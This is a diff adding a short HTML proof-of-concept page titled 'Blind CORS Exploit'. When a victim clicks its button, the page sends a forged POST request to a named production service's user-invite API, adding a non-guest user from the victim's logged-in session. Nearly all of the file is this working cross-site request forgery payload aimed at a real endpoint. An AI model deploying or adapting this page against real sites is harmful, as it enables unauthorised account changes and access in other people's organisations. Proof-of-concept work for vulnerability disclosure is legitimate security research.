@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head><title>Blind CORS PoC</title></head>
+<body>
+  <h1>Blind CORS Exploit</h1>
+  <button onclick="send()">Send Invite</button>
+
+  <script>
+    function send() {
+      fetch("https://app.small-improvements.com/api/v2/users/invite", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify([{
+          firstName: "rwerwe",
+          lastName: "werwe",
+          workEmail: "fdsjfd@fdkjsf.com",
+          isGuest: false,
+          personalMessage: "",
+          shouldSendNotification: true
+        }])
+      });
+
+      alert("Request sent — no response due to CORS but action should be successful.");
+    }
+  </script>
+</body>
+</html>
